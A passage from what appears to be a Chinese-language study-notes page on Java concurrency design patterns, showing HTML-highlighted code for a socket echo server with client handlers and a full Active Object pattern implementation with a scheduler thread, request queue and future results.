    <span class="token comment">/**
     * 清理线程程池资源
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"清理线程程池资源....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 关闭客户端链接</span>
        clientHandlers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span><span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 关闭服务端
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"关闭服务端....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"服务端正常关闭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"服务端关闭失败 : "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>客户端</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 处理客户端请求
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClientHandler</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> running <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Socket</span> socket<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ClientHandler</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> socket<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token class-name">BufferedReader</span> bufferedReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token class-name">OutputStream</span> outputStream <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token class-name">PrintWriter</span> printWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>running<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 读取客户端提供数据</span>
                <span class="token class-name">String</span> message <span class="token operator">=</span> bufferedReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>message <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取客户端数据 &gt;"</span> <span class="token operator">+</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 回写数据给客户端</span>
                printWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"echo "</span> <span class="token operator">+</span> message <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                printWriter<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"客户端正常关闭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>running<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 客户端已经执行完成：balking设计模式</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>running <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"客户端正常关闭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"客户端关闭失败："</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>测试类：启动服务端</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppServerClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">AppServer</span> appServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AppServer</span><span class="token punctuation">(</span><span class="token number">12312</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        appServer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Thread.sleep(20_000L);</span>
        <span class="token comment">// appServer.shutDown();</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
</ol>
<h1>Chapter17：Worker-Thread 设计模式</h1>
<p>线程池在某种意义上也是一种worker-thread设计模式的实现</p>
<blockquote>
<p>Java高并发编程详解：第二十六章</p>
</blockquote>
<h1>Chapter18：Active Objects 设计模式</h1>
<p>拥有独立线程的对象（主动对象）接受异步消息，并且能够返回处理结果的设计模式</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1fe2af03-d148-4791-adfe-993c1c9ec1db.png" alt="active-object设计模式"></p>
<p>功能说明：提交任务、执行任务拆分为两个独立的线程</p>
<ol>
<li>
<p><code>ActiveObjectFactory </code>创建<code> ActiveObjectProxy</code>，ActiveObjectProxy 包含了 ActiveObject的两种行为方式</p>
</li>
<li>
<p><code>ActiveObjectProxy </code> 包含一个执行任务线程： <code>SchedulerThread </code>，创建即启动，监听任务队列<code>ActivationQueue</code>，有任务，就处理。</p>
</li>
<li>
<p><code>ActiveObjectProxy </code> 接收到的 <code>makeString </code>任务和 <code>displayString </code>任务都被包装为<code>MethodRequest</code>提交到<code>SchedulerThread</code>的任务队列<code>ActivationQueue</code>。</p>
<p>每个任务的具体执行包含在<code>MethodRequest</code>中（抽象的<code>execute</code>方法，由子类实现）。</p>
</li>
<li>
<p><code>MethodRequest</code>执行<code>execute</code>任务之后 ，将执行结果反馈给<code>FutureResult</code></p>
</li>
</ol>
<p>具体代码如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 任务定义接口
 */</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ActiveObject</span> <span class="token punctuation">{</span>

    <span class="token class-name">Result</span> <span class="token function">makeString</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">,</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">displayString</span><span class="token punctuation">(</span><span class="token class-name">String</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">ActiveObjectProxy</span> <span class="token keyword">implements</span> <span class="token class-name">ActiveObject</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">SchedulerThread</span> schedulerThread<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Servant</span> servant<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ActiveObjectProxy</span><span class="token punctuation">(</span><span class="token class-name">SchedulerThread</span> schedulerThread<span class="token punctuation">,</span> <span class="token class-name">Servant</span> servant<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>schedulerThread <span class="token operator">=</span> schedulerThread<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>servant <span class="token operator">=</span> servant<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/**
     * 将提交的request任务（makeString）推送到执行线程
     *
     * @return FutureResult：包装任务完成的执行结果
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">makeString</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">,</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">FutureResult</span> future <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        schedulerThread<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MakeStringRequest</span><span class="token punctuation">(</span>servant<span class="token punctuation">,</span> future<span class="token punctuation">,</span> count<span class="token punctuation">,</span> fillChar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> future<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 将提交的request任务（displayString）推送到执行线程
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">displayString</span><span class="token punctuation">(</span><span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        schedulerThread<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DisplayStringRequest</span><span class="token punctuation">(</span>servant<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 任务的具体定义类
 */</span>
<span class="token keyword">class</span> <span class="token class-name">Servant</span> <span class="token keyword">implements</span> <span class="token class-name">ActiveObject</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">makeString</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">,</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> fillChar<span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RealResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">displayString</span><span class="token punctuation">(</span><span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Display:"</span> <span class="token operator">+</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 由SchedulerThread管理的任务队列
 */</span>
<span class="token keyword">class</span> <span class="token class-name">ActivationQueue</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">MAX_METHOD_REQUEST_QUEUE_SIZE</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodRequest</span><span class="token punctuation">&gt;</span></span> methodQueue<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ActivationQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        methodQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 提交任务到任务队列
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">MethodRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>methodQueue<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token constant">MAX_METHOD_REQUEST_QUEUE_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        methodQueue<span class="token punctuation">.</span><span class="token function">addFirst</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/**
     * 从任务队列提取任务
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">MethodRequest</span> <span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>methodQueue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">MethodRequest</span> methodRequest <span class="token operator">=</span> methodQueue<span class="token punctuation">.</span><span class="token function">removeFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> methodRequest<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SchedulerThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ActivationQueue</span> activationQueue<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">SchedulerThread</span><span class="token punctuation">(</span><span class="token class-name">ActivationQueue</span> activationQueue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>activationQueue <span class="token operator">=</span> activationQueue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 提交任务到任务队列
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">MethodRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>activationQueue<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 执行任务队列中的任务
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 执行提交的任务的任务主体</span>
            <span class="token comment">// execute的内容，存在于提交的request中</span>
            activationQueue<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Result</span> <span class="token punctuation">{</span>
    <span class="token class-name">Object</span> <span class="token function">getResultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 仅包可见
 */</span>
<span class="token keyword">class</span> <span class="token class-name">RealResult</span> <span class="token keyword">implements</span> <span class="token class-name">Result</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> resultValue<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">RealResult</span><span class="token punctuation">(</span><span class="token class-name">Object</span> resultValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>resultValue <span class="token operator">=</span> resultValue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getResultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> resultValue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 返回的任务结果，仅包可见
 */</span>
<span class="token keyword">class</span> <span class="token class-name">FutureResult</span> <span class="token keyword">implements</span> <span class="token class-name">Result</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">Result</span> result<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> ready <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">setResult</span><span class="token punctuation">(</span><span class="token class-name">Result</span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>result <span class="token operator">=</span> result<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>ready <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token comment">// 通知等待提取任务结果的线程，任务结束</span>
